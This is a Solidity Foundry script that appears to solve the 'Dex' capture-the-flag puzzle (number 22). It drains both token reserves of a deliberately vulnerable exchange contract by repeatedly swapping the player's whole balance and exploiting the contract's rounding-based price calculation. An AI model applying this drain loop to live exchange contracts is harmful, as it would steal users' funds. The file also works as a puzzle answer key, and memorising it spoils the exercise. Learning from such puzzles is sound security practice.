// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Dex, SwappableToken} from "../../src/puzzles/22/Dex.sol";

contract DexSolution is Script {
    function run(address target) external {
        solve(target, msg.sender);
    }

    function solve(address target, address player) public {
        Dex dex = Dex(target);
        SwappableToken token1 = SwappableToken(dex.token1());
        SwappableToken token2 = SwappableToken(dex.token2());

        while(token1.balanceOf(address(dex)) > 0 && token2.balanceOf(address(dex)) > 0){
            swapAll(dex, token1, token2, player);
        }
    }

    function swapAll(Dex dex, SwappableToken token1, SwappableToken token2, address player) internal {
        uint256 playerBalance1 = token1.balanceOf(player);
        uint256 playerBalance2 = token2.balanceOf(player);

        SwappableToken tokenFrom;
        SwappableToken tokenTo;
        uint256 swapAmount;

        if(playerBalance1 >= playerBalance2){
            tokenFrom = token1;
            tokenTo = token2;
            swapAmount = playerBalance1;
        }else{
            tokenFrom = token2;
            tokenTo = token1;
            swapAmount = playerBalance2;
        }
        uint256 remainBalance = tokenTo.balanceOf(address(dex));
        uint256 maxSwapAmount = dex.getSwapPrice(address(tokenTo), address(tokenFrom), remainBalance);

        if(swapAmount > maxSwapAmount){
            swapAmount = maxSwapAmount;
        }

        vm.startBroadcast();
        tokenFrom.approve(address(dex), swapAmount);
        dex.swap(address(tokenFrom), address(tokenTo), swapAmount);
        vm.stopBroadcast();
    }

}